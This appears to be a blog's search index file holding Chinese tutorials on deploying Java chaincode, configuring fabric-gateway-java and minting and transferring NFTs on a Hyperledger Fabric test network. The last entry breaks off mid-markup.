<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fabric-gateway-java</title>
    <link href="/2022/03/29/fabric-gateway-java/"/>
    <url>/2022/03/29/fabric-gateway-java/</url>
    
    <content type="html"><![CDATA[<h3 id="部署合约"><a href="#部署合约" class="headerlink" title="部署合约"></a>部署合约</h3><p>1.maven部署需要下载很多依赖导致合约部署过程会非常漫长，所以可以直接在IDEA中对maven进行封装</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330171505985.png" alt="image-20220330171505985"></p><p>封装好的jar包就会保存在当前项目的target下，将生成好的chaincode.jar复制到虚拟机需要部署合约的文件夹中</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330171640230.png" alt="image-20220330171640230"></p><p>然后对合约进行部署：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#将bin目录中的二进制文件添加到CLI路径中</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-comment">#使用peer cli进行创建</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br><span class="hljs-comment">#设置fabric_cfg_path指向fabric-samples的core.yaml文件</span><br></code></pre></td></tr></table></figure><h4 id="1-1-创建链码包"><a href="#1-1-创建链码包" class="headerlink" title="1.1 创建链码包"></a>1.1 创建链码包</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package java-gateway-demo.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../java-gateway-demo/</span> <span class="hljs-params">--lang</span> java <span class="hljs-params">--label</span> java-gateway-demo_1<br></code></pre></td></tr></table></figure><h4 id="1-2-安装链码"><a href="#1-2-安装链码" class="headerlink" title="1.2 安装链码"></a>1.2 安装链码</h4><p>设置org1节点安装链码</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-comment">#安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java-gateway-demo.tar.gz<br></code></pre></td></tr></table></figure><p>org2同理</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-comment">#安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java-gateway-demo.tar.gz<br></code></pre></td></tr></table></figure><strong><font color="red">注意：安装链码时，链码由peer节点构建。如果智能合约代码有问题，install命令将从链码中返回所有构建错误。因为安装 java 链码的时候需要经过 maven 构建以及下载依赖包的过程这个过程有可能会较慢，所以 install 命令有可能会返回一个超时错误:。但是其实链码的 docker 容器内此时还在执行构建任务没有完成。等到构建成功了链码包也就安装成功了。</font></strong><p><img src="/2022/03/29/fabric-gateway-java/image-20220330172320681.png" alt="image-20220330172320681"></p><h4 id="1-3-通过链码定义参数"><a href="#1-3-通过链码定义参数" class="headerlink" title="1.3 通过链码定义参数"></a>1.3 通过链码定义参数</h4><p>安装链码之后需要通过链码定义名称、版本、和背书策略</p><p>如果链码中已经安装过则需要在其组织通过的链码定义中包括包ID。包ID将用于将peer节点上安装的链码与通过的链码的定义相关联，并且允许组织使用链码来认可交易。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#查询包的ID</span><br><span class="hljs-attribute">peer</span> lifecycle chaincode queryinstalled<br><span class="hljs-comment">#将返回的结果添加到环境变量中</span><br><span class="hljs-attribute">export</span> NEW_CC_PACKAGE_ID=hyperledger-fabric-contract-java-demo_<span class="hljs-number">2</span>:c<span class="hljs-number">0</span>f<span class="hljs-number">7</span>f<span class="hljs-number">11</span>c<span class="hljs-number">5</span>a<span class="hljs-number">75</span>b<span class="hljs-number">0872</span>cec<span class="hljs-number">6</span>cf<span class="hljs-number">69</span>ee<span class="hljs-number">6</span>c<span class="hljs-number">8</span>ca<span class="hljs-number">7</span>d<span class="hljs-number">6</span>cdec<span class="hljs-number">5</span>df<span class="hljs-number">35</span>e<span class="hljs-number">1364</span>c<span class="hljs-number">4</span>e<span class="hljs-number">949064</span>a<span class="hljs-number">8</span>b<span class="hljs-number">831</span><br></code></pre></td></tr></table></figure><h4 id="1-4-org1通过链码定义"><a href="#1-4-org1通过链码定义" class="headerlink" title="1.4 org1通过链码定义"></a>1.4 org1通过链码定义</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#设置链码</span><br>export CORE_PEER_LOCALMSPID=<span class="hljs-string">&quot;Org1MSP&quot;</span><br>export CORE_PEER_MSPCONFIGPATH=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/Admin@org1.example.com/m</span>sp<br>export CORE_PEER_TLS_ROOTCERT_FILE=<span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls/ca.crt<br>export CORE_PEER_ADDRESS=localhost:<span class="hljs-number">7051</span><br><span class="hljs-comment">#approveformyorg定义</span><br>peer lifecycle chaincode approveformyorg -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">2.0</span> --package-id <span class="hljs-variable">$NEW_CC_PACKAGE_ID</span> --sequence <span class="hljs-number">2</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><h4 id="1-5-将链码提交给通道"><a href="#1-5-将链码提交给通道" class="headerlink" title="1.5 将链码提交给通道"></a>1.5 将链码提交给通道</h4><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#使用checkcommitreadiness来检查是否已经批准相同的链码定义：<br>peer lifecycle chaincode checkcommitreadiness --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">2.0</span> --sequence <span class="hljs-number">2</span> --tls --cafile $&#123;PWD&#125;<span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --output json<br><br><span class="hljs-keyword">return</span>如下则表示准许通过<br>&#123;<br><span class="hljs-string">&quot;approvals&quot;</span>: &#123;<br><span class="hljs-string">&quot;Org1MSP&quot;</span>: <span class="hljs-keyword">true</span>,<br><span class="hljs-string">&quot;Org2MSP&quot;</span>: <span class="hljs-keyword">true</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>升级链码:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode commit -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --channelID mychannel --name hyperledger-fabric-app-java-demo --version <span class="hljs-number">1.0</span> --sequence <span class="hljs-number">1</span> --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt<br></code></pre></td></tr></table></figure><p>可以使用peer lifecycle chaincode querycommitted命令来确认链码定义已提交给通道。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer lifecycle chaincode querycommitted --channelID mychannel --name hyperledger-fabric-app-java-demo --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem<br></code></pre></td></tr></table></figure><p>成功返回链码的定义顺序和版本之后可以调用链码进行测试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">peer chaincode invoke -o localhost:<span class="hljs-number">7050</span> --ordererTLSHostnameOverride orderer.example.com --tls --cafile <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>ordererOrganizations<span class="hljs-regexp">/example.com/</span>orderers<span class="hljs-regexp">/orderer.example.com/m</span>sp<span class="hljs-regexp">/tlscacerts/</span>tlsca.example.com-cert.pem -C mychannel -n chaincode_demo_1 --peerAddresses localhost:<span class="hljs-number">7051</span> --tlsRootCertFiles <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/</span>peers<span class="hljs-regexp">/peer0.org1.example.com/</span>tls<span class="hljs-regexp">/ca.crt --peerAddresses localhost:9051 --tlsRootCertFiles $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org2.example.com<span class="hljs-regexp">/peers/</span>peer0.org2.example.com<span class="hljs-regexp">/tls/</span>ca.crt -c <span class="hljs-string">&#x27;&#123;&quot;function&quot;:&quot;createCat&quot;,&quot;Args&quot;:[&quot;cat-KEY&quot;,&quot;test - KEY&quot;,12, &quot;red&quot;, &quot;aaa&quot;]&#125;&#x27;</span><br><br>peer chaincode query -C mychannel -n hyperledger-fabric-contract-java-demo -c <span class="hljs-string">&#x27;&#123;&quot;Args&quot;:[&quot;queryCat&quot; , &quot;cat-0&quot;]&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-定义fabric-gateway-java的配置文件"><a href="#2-定义fabric-gateway-java的配置文件" class="headerlink" title="2.定义fabric-gateway-java的配置文件"></a>2.定义fabric-gateway-java的配置文件</h3><p>参考<a href="%22https://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection.json%22">gateway的github</a></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330205633378.png" alt="image-20220330205633378"></p><p>其中需要修改的地方有两点</p><ul><li>crypto-config中的证书文件需要替换启动环境中的文件</li><li>networkConnection可以copygithub中的例子，其中与peer节点交互的ip需改成虚拟机中的IP</li></ul><p>其中application.properties中的内容为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 应用名称</span><br>spring.application.name=hyperledger-fabric-app-java-demo<br><span class="hljs-comment"># 应用服务 WEB 访问端口</span><br>server.port=<span class="hljs-number">8080</span><br><br><span class="hljs-comment">#网络配置</span><br>fabric.networkConnectionConfigPath=src<span class="hljs-regexp">/main/</span>resources/networkConnection.json<br><span class="hljs-comment">#证书路径</span><br>fabric.certificatePath=src<span class="hljs-regexp">/main/</span>resources<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/User1@org1.example.com/m</span>sp<span class="hljs-regexp">/signcerts/</span>User1@org1.example.com-cert.pem<br><span class="hljs-comment">#私钥路径</span><br>fabric.privateKeyPath=src<span class="hljs-regexp">/main/</span>resources<span class="hljs-regexp">/crypto-config/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/u</span>sers<span class="hljs-regexp">/User1@org1.example.com/m</span>sp<span class="hljs-regexp">/keystore/</span>priv_sk<br><br>logging.level.org.hyperledger=trace<br></code></pre></td></tr></table></figure><p>Controller中获取的name也需要和虚拟机中启动的链码的name相对应</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210328591.png" alt="image-20220330210328591"></p><p>写好直接启动进行测试即可，使用postman去调用gateway的接口和虚拟机中的区块链进行交互</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210432218.png" alt="image-20220330210432218"></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210441286.png" alt="image-20220330210441286"></p><p>使用PUT方法对应的invoke中的createCat方法，传递过去的值需要以json的格式满足代码中的要求，尝试创建一个相同的对象则会返回其已经存在。</p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210635136.png" alt="image-20220330210635136"></p><p><img src="/2022/03/29/fabric-gateway-java/image-20220330210708825.png" alt="image-20220330210708825"></p><p>其他查询更新删除方法也类似，更换发包的类型则可以实现不同的方法。</p><p><a href="https://gitee.com/kernelHP/hyperledger-fabric-app-java-demo.git">gateway方法源码</a></p><p><a href="%5Bhttps://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection-tls.json%5D(https://gitee.com/link?target=https://github.com/hyperledger/fabric-gateway-java/blob/main/src/test/java/org/hyperledger/fabric/gateway/connection-tls.json)">connection.json配置文件参考</a></p><p><a href="https://gitee.com/kernelHP/hyperledger-fabric-contract-java-demo">智能合约源码</a></p><p><a href="https://blog.csdn.net/qq_28540443/article/details/104451259">SDK实践</a></p><p><a href="https://juejin.cn/post/6844904070390480910">设置背书策略</a></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NFT铸造and交易</title>
    <link href="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/"/>
    <url>/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/</url>
    
    <content type="html"><![CDATA[<p>首先将智能合约打包并且上链部署(ps:参考合约部署.md)</p><p>使用fabric-ca-cline注册生成org1和org2，org1代表管理端(铸币端)，org2代表接受端并生成其身份证书文件和MSP文件</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327204309210.png" alt="image-20220327204309210"></p><p>org2端同理，先注册然后使用fabric-ca-cline enroll生成</p><h3 id="铸币阶段"><a href="#铸币阶段" class="headerlink" title="铸币阶段"></a>铸币阶段</h3><p>使用peer来为org1铸造一个NFT</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205032216.png" alt="image-20220327205032216"></p><p>mint函数验证客户端是铸币者组织的成员然后为其生成一个不可替代的令牌，可以通过调用ClineAccountBalance函数来查看账户余额</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205213760.png" alt="image-20220327205213760"></p><p>我们还可以通过调用 <code>OwnerOf</code> 函数来检查已发行令牌的所有者。</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205257570.png" alt="image-20220327205257570"></p><h3 id="交易阶段"><a href="#交易阶段" class="headerlink" title="交易阶段"></a>交易阶段</h3><p>org1铸造者转账给org2，首先org2需要提供自己的账户ID作为收款地址，客户端可以从他们自己的公共证书中获取他们的账户ID，但是为了交易的准确和安全性，合约中ClientAccountID可以提供查看ID来将其作为账户ID</p><p>首先获取自己的ID</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205720956.png" alt="image-20220327205720956"></p><p>org2接受者向org1提供其用户ID之后，铸币者可以发起从他们账户到接受者的交易。（要转移不可替代的代币，铸币者还需要提供自己的账户 ID）</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327205934990.png" alt="image-20220327205934990"></p><p>进行交易，发现返回结果为successful，表示转账成功</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210302514.png" alt="image-20220327210302514"></p><p><code>TransferFrom</code> 函数验证给定不可替代令牌的所有权。<br>然后它将不可替代令牌的所有权从当前所有者更改为接收者。<br>它还将借记呼叫者的帐户并记入收件人的帐户。 请注意，示例合约将自动为接收者创建一个余额为零的账户，如果该账户尚不存在的话。</p><p>这时候在查询余额发现余额为0</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210358289.png" alt="image-20220327210358289"></p><p>然后使用 Org2 终端，让我们请求接收者的余额：</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210444083.png" alt="image-20220327210444083"></p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327210505718.png" alt="image-20220327210505718"></p><p>表示转账成功</p><h3 id="第三方转账-特定代币"><a href="#第三方转账-特定代币" class="headerlink" title="第三方转账 (特定代币)"></a>第三方转账 (特定代币)</h3><p>适用场景：</p><ul><li>铸币者已经根据上述场景创建了一个不可替代的代币。</li><li>同一铸币者客户端使用 <code>Approve</code> 功能授予运营商客户端代表铸币者转移具有特定代币 ID 的不可替代代币的权限。假设运营商已将其客户端 ID 提供给带外的“批准”呼叫者。</li><li>然后运营商客户端将使用“TransferFrom”功能代表铸币者将不可替代的代币转移到接收者的账户。假设接收方已将其客户端 ID 提供给带外的“TransferFrom”调用方。</li></ul><p>首先为第三方用户注册一个身份      test_1/test123</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327211908326.png" alt="image-20220327211908326"></p><p>为其生成身份证书andMSP文件夹</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212001845.png" alt="image-20220327212001845"></p><p>将节点OU配置文件复制到MSP文件夹中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp <span class="hljs-variable">$&#123;PWD&#125;</span><span class="hljs-regexp">/organizations/</span>peerOrganizations<span class="hljs-regexp">/org1.example.com/m</span>sp<span class="hljs-regexp">/config.yaml $&#123;PWD&#125;/</span>organizations<span class="hljs-regexp">/peerOrganizations/</span>org1.example.com<span class="hljs-regexp">/users/</span>operator@org1.example.com<span class="hljs-regexp">/msp/</span>config.yaml<br></code></pre></td></tr></table></figure><p>查询cline id可以看到id为test_1</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212236738.png" alt="image-20220327212236738"></p><p>org1客户端发行一个NFT然后请求转移令牌</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212633666.png" alt="image-20220327212633666"></p><p>然后可以通过Getapproved函数来检查运营商客户端的批准情况</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327212721379.png" alt="image-20220327212721379"></p><p>然后对代币进行交易</p><p><img src="/2022/03/12/NFT%E9%93%B8%E9%80%A0and%E4%BA%A4%E6%98%93/image-20220327213928865.png" alt="image-20220327213928865"></p><p><code>TransferFrom</code> 函数验证与调用客户端 ID 关联的帐户是否有权代表当前所有者转移给定令牌。<br>然后它将不可替代令牌的所有权从当前所有者更改为接收者。<br>它还将借记前所有者的帐户并贷记收件人的帐户。<br>它还将删除运营商对铸币者批准的这种不可替代令牌的许可。<br>请注意，示例合约将自动为接收者创建一个余额为零的账户，如果该账户尚不存在的话。</p><p><b><font color="red">参考fabric-samples中token-erc-721例子中的README.md实现</font></b></p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chaincode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安装链码</title>
    <link href="/2022/03/03/%E5%AE%89%E8%A3%85%E9%93%BE%E7%A0%81/"/>
    <url>/2022/03/03/%E5%AE%89%E8%A3%85%E9%93%BE%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="1-打包智能合约"><a href="#1-打包智能合约" class="headerlink" title="1. 打包智能合约"></a>1. 打包智能合约</h2><h3 id="1-1-进入test-network"><a href="#1-1-进入test-network" class="headerlink" title="1.1 进入test-network"></a>1.1 进入test-network</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">test-network</span><br></code></pre></td></tr></table></figure><h3 id="1-2-将bin目录中二进制文件添加环境变量"><a href="#1-2-将bin目录中二进制文件添加环境变量" class="headerlink" title="1.2 将bin目录中二进制文件添加环境变量"></a>1.2 将bin目录中二进制文件添加环境变量</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/../bin:$PATH<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">FABRIC_CFG_PATH</span>=<span class="hljs-variable">$PWD</span>/../config/<br></code></pre></td></tr></table></figure><h3 id="1-3-创建链码包"><a href="#1-3-创建链码包" class="headerlink" title="1.3 创建链码包"></a>1.3 创建链码包</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">peer lifecycle chaincode package java_gateway_demo.tar.gz <span class="hljs-params">--path</span> <span class="hljs-string">../java_gateway/</span> <span class="hljs-params">--lang</span> java <span class="hljs-params">--label</span> java_gateway_demo_1<br></code></pre></td></tr></table></figure><h2 id="2-安装链码"><a href="#2-安装链码" class="headerlink" title="2. 安装链码"></a>2. 安装链码</h2><p>打包java_gateway_demo智能合约后，在peer节点上安装链码。需要在将认可交易的每个peer节点上安装链码。因为我们将设置背书策略以要求来自Org1和Org2的背书，所以我们需要在两个组织的peer节点上安装链码</p><h3 id="2-1-Org1-peer节点安装链码"><a href="#2-1-Org1-peer节点安装链码" class="headerlink" title="2.1 Org1 peer节点安装链码"></a>2.1 Org1 peer节点安装链码</h3><p>设置以下环境变量，以Org1身份操作peer cli</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ENABLED</span>=<span class="hljs-literal">true</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org1MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:7051<br><span class="hljs-comment"># peer lifecycle chaincode安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java_gateway_demo.tar.gz<br></code></pre></td></tr></table></figure><h3 id="2-2-Org2-peer节点安装链码"><a href="#2-2-Org2-peer节点安装链码" class="headerlink" title="2.2 Org2 peer节点安装链码"></a>2.2 Org2 peer节点安装链码</h3><p>设置以下环境变量，以Org2身份操作peer CLI</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_LOCALMSPID</span>=<span class="hljs-string">&quot;Org2MSP&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_TLS_ROOTCERT_FILE</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_MSPCONFIGPATH</span>=<span class="hljs-variable">$&#123;PWD&#125;</span>/organizations/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">CORE_PEER_ADDRESS</span>=localhost:9051<br><span class="hljs-comment"># peer lifecycle chaincode安装链码</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">peer </span>lifecycle chaincode install java_gateway_demo.tar.gz<br></code></pre></td></tr></table></figure><strong><font color="red">注意：安装链码时，链码由peer节点构建。如果智能合约代码有问题，install命令将从链码中返回所有构建错误。因为安装 java 链码的时候需要经过 maven 构建以及下载依赖包的过程这个过程有可能会较慢，所以 install 命令有可能会返回一个超时错误:。但是其实链码的 docker 容器内此时还在执行构建任务没有完成。等到构建成功了链码包也就安装成功了。</font></strong><h2 id="3-通过链码定义"><a href="#3-通过链码定义" 